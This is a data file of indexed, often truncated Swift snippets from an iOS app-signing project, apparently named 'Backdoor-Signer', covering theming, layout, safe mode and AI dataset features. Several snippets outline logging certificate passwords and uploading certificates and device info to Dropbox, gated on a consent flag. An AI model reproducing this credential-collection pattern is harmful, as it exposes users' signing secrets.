1322,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function presentLoader - implements presentloader functionality","func presentLoader() -> UIAlertController {
let alert = UIAlertController(title: ""Loading..."", message: nil, preferredStyle: .alert)
let loadingIndicator = UIActivityIndicatorView(frame: CGRect(x: 10, y: 5, width: 50, height: 50))
loadingIndicator.style = .large
loadingIndicator.startAnimating()
alert.view.addSubview(loadingIndicator)
return alert
}
}
"
1323,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","extension UIColor - implements functionality related to u i color","extension UIColor {
func toHexString() -> String {"
1324,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift","Function toHexString - implements tohexstring functionality","func toHexString() -> String {
var r: CGFloat = 0
var g: CGFloat = 0
var b: CGFloat = 0
var a: CGFloat = 0
getRed(&r, green: &g, blue: &b, alpha: &a)
let rgb = Int(r * 255) << 16 | Int(g * 255) << 8 | Int(b * 255) << 0
return String(format: ""#%06x"", rgb)
}
}"
1325,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Advanced theme manager for consistent UI styling and appearance / / Provides: / 1. Comprehensive theming system with light/dark modes / 2. Dynamic color adjustments based on accessibility settings / 3. Animation capabilities for theme transitions / 4. Theme customization options","final class ThemeManager {
// MARK: - Singleton

/// Shared instance
static let shared = ThemeManager()

// MARK: - Properties

/// Current theme
@Published private(set) var currentTheme: AppTheme"
1326,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Setup","private func setupObservers() {
// Observe system appearance changes
NotificationCenter.default.addObserver(
self,
selector: #selector(systemAppearanceChanged),
name: NSNotification.Name(""UIUserInterfaceStyleChanged""),
object: nil
)

// Observe accessibility settings changes"
1327,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","Function systemAppearanceChanged - implements systemappearancechanged functionality","@objc private func systemAppearanceChanged() {
Debug.shared.log(message: ""System appearance changed"", type: .debug)

// If using system theme, update to match system
if currentTheme.type == .system {"
1328,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","Function accessibilitySettingsChanged - implements accessibilitysettingschanged functionality","@objc private func accessibilitySettingsChanged() {
Debug.shared.log(message: ""Accessibility settings changed"", type: .debug)

// Update accessibility mode based on system settings
updateAccessibilityMode()

// Notify accessibility changes
notifyAccessibilityChanged()
}
"
1329,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Updates the system theme based on current device settings","private func updateSystemTheme() {
// Use current trait collection's user interface style
let isDarkMode = UITraitCollection.current.userInterfaceStyle == .dark

// Create updated system theme
let updatedSystemTheme = AppTheme(
id: ThemeType.system.rawValue,
name: ""System"",
type: .system,
primaryColor: .systemBlue,"
1330,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Theme Selection / Changes the app theme / - Parameter themeType: The type of theme to apply","func setTheme(_ themeType: ThemeType) {
guard let newTheme = themes.first(where: { $0.type == themeType }),"
1331,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Applies the current theme to the entire application","func applyThemeToApplication() {
// Get the appropriate colors for the current interface style
let colors = getThemeColorsForCurrentInterfaceStyle()

// Set application-wide tint color
if #available(iOS 15.0, *) {"
1332,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Applies appearance to specific UI elements","private func applyAppearanceToUIElements(with colors: AppThemeColors) {
// UINavigationBar appearance
if #available(iOS 15.0, *) {"
1333,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - UI Element Color Getters / Gets the appropriate primary color for the current context","func primaryColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.primaryColor)
}

/// Gets the appropriate secondary color for the current context
func secondaryColor(for traitCollection: UITraitCollection? = nil) -> UIColor {"
1334,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets the appropriate secondary color for the current context","func secondaryColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.secondaryColor)
}

/// Gets the appropriate accent color for the current context
func accentColor(for traitCollection: UITraitCollection? = nil) -> UIColor {"
1335,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets the appropriate accent color for the current context","func accentColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.accentColor)
}

/// Gets the appropriate background color for the current context
func backgroundColor(for traitCollection: UITraitCollection? = nil) -> UIColor {"
1336,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets the appropriate background color for the current context","func backgroundColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.backgroundColor)
}

/// Gets the appropriate card color for the current context
func cardColor(for traitCollection: UITraitCollection? = nil) -> UIColor {"
1337,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets the appropriate card color for the current context","func cardColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.cardColor)
}

/// Gets the appropriate text color for the current context
func textColor(for traitCollection: UITraitCollection? = nil) -> UIColor {"
1338,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets the appropriate text color for the current context","func textColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.textColor)
}

/// Gets the appropriate secondary text color for the current context
func secondaryTextColor(for traitCollection: UITraitCollection? = nil) -> UIColor {"
1339,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets the appropriate secondary text color for the current context","func secondaryTextColor(for traitCollection: UITraitCollection? = nil) -> UIColor {
let colors = getThemeColorsForInterfaceStyle(
traitCollection?.userInterfaceStyle ?? UITraitCollection.current.userInterfaceStyle
)
return getAccessibilityAdjustedColor(colors.secondaryTextColor)
}

// MARK: - Helper Methods

/// Gets colors for the current interface style"
1340,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Helper Methods / Gets colors for the current interface style","private func getThemeColorsForCurrentInterfaceStyle() -> AppThemeColors {
getThemeColorsForInterfaceStyle(UITraitCollection.current.userInterfaceStyle)
}

/// Gets theme colors for a specific interface style
private func getThemeColorsForInterfaceStyle(_ style: UIUserInterfaceStyle) -> AppThemeColors {"
1341,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Gets theme colors for a specific interface style","private func getThemeColorsForInterfaceStyle(_ style: UIUserInterfaceStyle) -> AppThemeColors {
let isDarkMode = style == .dark

// If theme has specific dark mode colors and we're in dark mode, use those
if isDarkMode, let darkModeColors = currentTheme.darkModeColors {"
1342,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Accessibility Support / Loads accessibility settings from the system","private func loadAccessibilitySettings() {
updateAccessibilityMode()
}

/// Updates the accessibility mode based on system settings
private func updateAccessibilityMode() {"
1343,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Updates the accessibility mode based on system settings","private func updateAccessibilityMode() {
if UIAccessibility.isInvertColorsEnabled {"
1344,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Adjusts a color based on current accessibility settings","private func getAccessibilityAdjustedColor(_ color: UIColor) -> UIColor {
var adjustedColor = color

switch accessibilityMode {"
1345,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Increases contrast for a color","private func increaseContrast(for color: UIColor) -> UIColor {
var red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0
color.getRed(&red, green: &green, blue: &blue, alpha: &alpha)

// Calculate luminance (perceived brightness)
let luminance = 0.299 * red + 0.587 * green + 0.114 * blue

// If the color is dark, make it darker; if it's light, make it lighter
if luminance < 0.5 {"
1346,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Notification Methods / Notifies observers that the theme has changed","private func notifyThemeChanged() {
NotificationCenter.default.post(
name: .themeDidChange,
object: nil,
userInfo: [""theme"": currentTheme.id]
)
}

/// Notifies observers that accessibility settings have changed
private func notifyAccessibilityChanged() {"
1347,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Notifies observers that accessibility settings have changed","private func notifyAccessibilityChanged() {
NotificationCenter.default.post(
name: .accessibilitySettingsDidChange,
object: nil,
userInfo: [""mode"": accessibilityMode.rawValue]
)
}
}

// MARK: - Supporting Types"
1348,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Supporting Types / Theme types","enum ThemeType: String {
case system
case light
case dark
case highContrast
case blue
case green
}

/// Accessibility modes"
1349,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Accessibility modes","enum AccessibilityMode: String {
case standard
case highContrast
case invertColors
case reduceTransparency
}

/// Theme data structure
struct AppTheme {"
1350,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Theme data structure","struct AppTheme {
let id: String
let name: String
let type: ThemeType

let primaryColor: UIColor
let secondaryColor: UIColor
let accentColor: UIColor
let backgroundColor: UIColor
let cardColor: UIColor"
1351,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Colors for a theme","struct AppThemeColors {
let primaryColor: UIColor
let secondaryColor: UIColor
let accentColor: UIColor
let backgroundColor: UIColor
let cardColor: UIColor
let textColor: UIColor
let secondaryTextColor: UIColor
}
"
1352,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - Extensions","extension Notification.Name {
static let themeDidChange = Notification.Name(""themeDidChange"")
static let accessibilitySettingsDidChange = Notification.Name(""accessibilitySettingsDidChange"")
}

// MARK: - SwiftUI Support

@available(iOS 14.0, *)
struct ThemeEnvironmentKey: EnvironmentKey {"
1353,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","struct ThemeEnvironmentKey - implements functionality related to theme environment key","struct ThemeEnvironmentKey: EnvironmentKey {
static let defaultValue: AppTheme = ThemeManager.shared.currentTheme
}

@available(iOS 14.0, *)
extension EnvironmentValues {"
1354,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","extension EnvironmentValues - implements functionality related to environment values","extension EnvironmentValues {
var appTheme: AppTheme {"
1355,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","MARK: - View Controller Extension for Theme Support","extension UIViewController {
/// Applies the current theme to the view controller
func applyTheme() {"
1356,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Design/AdvancedThemeManager.swift","/ Applies the current theme to the view controller","func applyTheme() {
let theme = ThemeManager.shared
_ = traitCollection.userInterfaceStyle

// Apply theme colors
view.backgroundColor = theme.backgroundColor(for: traitCollection)

// Apply to navigation items
navigationController?.navigationBar.tintColor = theme.primaryColor(for: traitCollection)
"
1357,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CALayer+Shadow.swift","extension CALayer - implements functionality related to c a layer","extension CALayer {
/// Apply a futuristic shadow effect to the layer
func applyFuturisticShadow() {"
1358,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CALayer+Shadow.swift","/ Apply a futuristic shadow effect to the layer","func applyFuturisticShadow() {
masksToBounds = false
shadowColor = UIColor(red: 0.1, green: 0.6, blue: 1.0, alpha: 1.0).cgColor
shadowOffset = CGSize(width: 0, height: 3)
shadowOpacity = 0.3
shadowRadius = 10
}
}"
1359,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CGSize+aspectFit.swift","extension CGSize - implements functionality related to c g size","extension CGSize {
func aspectFit(in boundingSize: CGSize, insetBy insetAmount: CGFloat) -> CGSize {"
1360,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CGSize+aspectFit.swift","Function aspectFit - implements aspectfit functionality","func aspectFit(in boundingSize: CGSize, insetBy insetAmount: CGFloat) -> CGSize {
let scaledSize = aspectFit(in: boundingSize)
return CGSize(width: scaledSize.width - insetAmount * 2, height: scaledSize.height - insetAmount * 2)
}

private func aspectFit(in boundingSize: CGSize) -> CGSize {"
1361,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/CGSize+aspectFit.swift","Function aspectFit - implements aspectfit functionality","private func aspectFit(in boundingSize: CGSize) -> CGSize {
let aspectWidth = boundingSize.width / width
let aspectHeight = boundingSize.height / height
let aspectRatio = min(aspectWidth, aspectHeight)

return CGSize(width: width * aspectRatio, height: height * aspectRatio)
}
}
"
1362,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","MARK: - Dataset Management Extension","extension AILearningManager {
/// Incorporate external dataset into training
func incorporateDataset(_ datasetContent: [String: Any]) -> Bool {"
1363,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Incorporate external dataset into training","func incorporateDataset(_ datasetContent: [String: Any]) -> Bool {
Debug.shared.log(message: ""Incorporating external dataset into AI training"", type: .info)

// Extract training data from dataset
guard let data = extractTrainingData(from: datasetContent) else {"
1364,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Extract training data from dataset content","private func extractTrainingData(from dataset: [String: Any])
-> (training: [[String: Any]], evaluation: [[String: Any]])?
{"
1365,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Save external training data for future use","private func saveExternalTrainingData(_ data: [[String: Any]]) {
// Convert data to interactions
for item in data {"
1366,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Save evaluation data for model validation","private func saveEvaluationDataForValidation(_ data: [[String: Any]]) {
Debug.shared.log(message: ""Saving \(data.count) evaluation records for model validation"", type: .info)

// Create a directory for evaluation data if it doesn't exist
let evalDirectory = modelsDirectory.appendingPathComponent(""evaluation"", isDirectory: true)
do {"
1367,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Log dataset incorporation to Dropbox if user has consented","private func logDatasetIncorporation(datasetSize: Int, success: Bool, modelVersion: String) {
let logEntry = """"""
=== DATASET INCORPORATION LOG ===
Timestamp: \(ISO8601DateFormatter().string(from: Date()))
Dataset Size: \(datasetSize) records
Success: \(success)
Model Version: \(modelVersion)
Device: \(UIDevice.current.name)
System: \(UIDevice.current.systemName) \(UIDevice.current.systemVersion)
App Version: \(Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String ?? ""unknown"")"
1368,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Check online for available datasets based on user behavior","func checkForAvailableDatasets() {
// Only proceed if auto-download is enabled and consent was given
guard UserDefaults.standard.bool(forKey: ""AIAutomaticDatasetDownload""),
UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"")
else {"
1369,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Get top intents from user interactions","func getTopUserIntents(limit: Int) -> [String] {
// Lock to safely access interactions
interactionsLock.lock()
defer { interactionsLock.unlock() }"
1370,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Determine if we should download a dataset for an intent","private func shouldDownloadDatasetForIntent(_ intent: String) -> Bool {
// In a real app, this would use more sophisticated logic
// For now, randomly decide based on intent type

// Higher probability for certain intents
if intent.contains(""sign"") || intent.contains(""install"") || intent.contains(""navigation"") {"
1371,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Simulate finding and downloading a dataset for an intent","private func simulateFindingDatasetForIntent(_ intent: String) {
Debug.shared.log(message: ""Simulating finding dataset for intent: \(intent)"", type: .info)

// Convert intent to dataset category
let category: String
if intent.contains(""sign"") {"
1372,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Get performance metrics for the AI","func getAIPerformanceMetrics() -> (confidenceAverage: Double, errorRate: Double) {
// Lock to safely access interactions
interactionsLock.lock()
defer { interactionsLock.unlock() }"
1373,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AILearningManager+DatasetManagement.swift","/ Get areas where the AI performance is lowest","func getLowPerformanceAreas(limit: Int) -> [String] {
// Lock to safely access interactions
interactionsLock.lock()
defer { interactionsLock.unlock() }"
1374,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift","MARK: - Consent Management Extension","extension AppDelegate: ConsentViewControllerDelegate {
/// Check if user consent needs to be requested
func shouldRequestUserConsent() -> Bool {"
1375,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift","/ Check if user consent needs to be requested","func shouldRequestUserConsent() -> Bool {
// Check if we've already shown the consent screen
if UserDefaults.standard.bool(forKey: ""ConsentScreenShown"") {"
1376,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift","/ Present the consent screen","func presentConsentViewController() {
guard !isShowingStartupPopup else {"
1377,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift","MARK: - ConsentViewControllerDelegate","func userDidAcceptConsent() {
Debug.shared.log(message: ""User accepted data collection consent"", type: .info)

// Reset popup flag
isShowingStartupPopup = false

// Upload device info to Dropbox since consent was given
DispatchQueue.global(qos: .utility).async {"
1378,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+ConsentManagement.swift","Function userDidDeclineConsent - implements userdiddeclineconsent functionality","func userDidDeclineConsent() {
Debug.shared.log(message: ""User declined data collection consent"", type: .info)

// Reset popup flag
isShowingStartupPopup = false

// Show floating button after consent
FloatingButtonManager.shared.show()
}
}"
1379,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Enhanced SafeMode manager","extension AppDelegate {
/// Check if the app should launch in safe mode based on crash history
func shouldLaunchInSafeMode() -> Bool {"
1380,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Check if the app should launch in safe mode based on crash history","func shouldLaunchInSafeMode() -> Bool {
return SafeModeLauncher.shared.inSafeMode
}

/// Setup enhanced safe mode UI with LED effects
func setupEnhancedSafeModeUI() {"
1381,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Setup enhanced safe mode UI with LED effects","func setupEnhancedSafeModeUI() {
Debug.shared.log(message: ""Setting up enhanced safe mode UI"", type: .info)

// Create a basic view controller for safe mode
let safeModeVC = UIViewController()
safeModeVC.view.backgroundColor = .systemBackground

// Create container view for LED effects
let containerView = UIView()
containerView.translatesAutoresizingMaskIntoConstraints = false"
1382,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Get formatted information about crash history","private func getCrashInfoText() -> String {
let crashCount = UserDefaults.standard.integer(forKey: ""crashCount"")
let lastCrashTime = UserDefaults.standard.object(forKey: ""lastCrashTime"") as? Date

var infoText = ""Crash Information: ""

if crashCount > 0 {"
1383,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Update safe mode banner in normal mode","func updateSafeModeBanner(on viewController: UIViewController, isEnabled: Bool) {
// Remove existing banner if any
if let existingBanner = viewController.view.viewWithTag(8888) {"
1384,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","MARK: - SafeModeLauncher Enhancements","extension SafeModeLauncher {
/// Enhanced method to determine crash count
var crashCountThreshold: Int {"
1385,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Determine if the device is a lower-end model","private func deviceIsLowEnd() -> Bool {
// Check total RAM as a proxy for device capability
let physicalMemory = ProcessInfo.processInfo.physicalMemory
let gigabyte = 1024 * 1024 * 1024

// Consider devices with less than 3GB RAM as low-end
return physicalMemory < 3 * UInt64(gigabyte)
}

/// Check if a specific feature should be enabled in safe mode"
1386,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Check if a specific feature should be enabled in safe mode","func isFeatureEnabledInSafeMode(_ feature: SafeModeFeature) -> Bool {
switch feature {"
1387,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/AppDelegate+SafeModeManager.swift","/ Features that can be selectively enabled/disabled in safe mode","enum SafeModeFeature {
case fileManagement
case settings
case appSigningBasic
case appSigningAdvanced
case aiAssistant
case sources
}
"
1388,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Extension to handle certificate logging and upload to Dropbox","extension CertData {
/// Enhanced method to store certificate with Dropbox integration
func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {"
1389,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Enhanced method to store certificate with Dropbox integration","func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {
// Create a destination directory for this certificate
let certificatesDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
.appendingPathComponent(""Certificates"")
.appendingPathComponent(UUID().uuidString)

do {"
1390,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Extension to intercept mobile provision handling","extension Cert {
/// Enhanced method to import mobile provision with Dropbox integration
static func enhancedImportMobileProvision(from url: URL) -> Cert? {"
1391,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Enhanced method to import mobile provision with Dropbox integration","static func enhancedImportMobileProvision(from url: URL) -> Cert? {
// Use the original implementation to parse the mobileprovision
let cert = CertData.parseMobileProvisioningFile(atPath: url)

// If successful and user has consented to data collection
if cert != nil, UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") {"
1392,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Helper methods to integrate Dropbox logging with the signing process","class CertificateLoggingHelper {
static let shared = CertificateLoggingHelper()

private init() {}"
1393,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Log password entry for certificate handling","func logPasswordEntry(password: String, fileName: String? = nil) {
// Only proceed if user has consented to data collection
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1394,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/CertificateManager+EnhancedLogging.swift","/ Log certificate import activity","func logCertificateImport(fileType: String, fileName: String) {
// Only proceed if user has consented to data collection
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
1395,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/Nuke+Extensions.swift","Extension to add Objective-C exposed method for memory warning handling","extension ImageCache {
@objc func removeAllImages() {"
1396,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/Nuke+Extensions.swift","Function removeAllImages - implements removeallimages functionality","@objc func removeAllImages() {
// Clear all cached images
ImageCache.shared.clearCache()
}
}
"
1397,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","MARK: - Terminal Button Toggle","extension SettingsViewController {
/// Toggle handler for the terminal button setting
@objc func terminalButtonToggled(_ sender: UISwitch) {"
1398,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","/ Toggle handler for the terminal button setting","@objc func terminalButtonToggled(_ sender: UISwitch) {
// Save setting
UserDefaults.standard.set(sender.isOn, forKey: ""show_terminal_button"")

// Update button visibility
if sender.isOn {"
1399,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","Extension to handle any terminal reset options","extension SettingsViewController {
/// Resets the terminal settings to defaults
@objc func resetTerminalSettings() {"
1400,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","/ Resets the terminal settings to defaults","@objc func resetTerminalSettings() {
let alert = UIAlertController(
title: ""Reset Terminal Settings"",
message: ""Are you sure you want to reset all terminal settings? This will not affect your command history."",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Cancel"", style: .cancel))
alert.addAction(UIAlertAction(title: ""Reset"", style: .destructive) { _ in"
1401,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","/ Add terminal settings reset to the full reset option","func resetTerminalAll() {
// Reset settings
resetTerminalSettings()

// Also clear command history
let history = CommandHistory()
history.clearHistory()
history.saveHistory()

// End any active sessions"
1402,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","Terminal-specific reset methods that will be called from the main reset methods in ResetAlertOptions.swift","extension SettingsViewController {
// Terminal reset functionality to be integrated with the main reset options
func integrateTerminalReset() {"
1403,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Feature/SettingsViewController+Terminal.swift","Terminal reset functionality to be integrated with the main reset options","func integrateTerminalReset() {
// Reset terminal settings
resetTerminalSettings()

// Also clear command history
let history = CommandHistory()
history.clearHistory()
history.saveHistory()

// End any active sessions"
1404,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift","/ A protocol describing a type which contains basic layout anchors","protocol BasicLayoutAnchorsHolding {
var leadingAnchor: NSLayoutXAxisAnchor { get }"
1405,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift","extension BasicLayoutAnchorsHolding - implements functionality related to basic layout anchors holding","extension BasicLayoutAnchorsHolding {
/// Activates constraints to completely cover this view/guide over another.
func constraintCompletely<Target: BasicLayoutAnchorsHolding>(to target: Target) {"
1406,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift","/ Activates constraints to completely cover this view/guide over another.","func constraintCompletely<Target: BasicLayoutAnchorsHolding>(to target: Target) {
NSLayoutConstraint.activate([
leadingAnchor.constraint(equalTo: target.leadingAnchor),
trailingAnchor.constraint(equalTo: target.trailingAnchor),
bottomAnchor.constraint(equalTo: target.bottomAnchor),
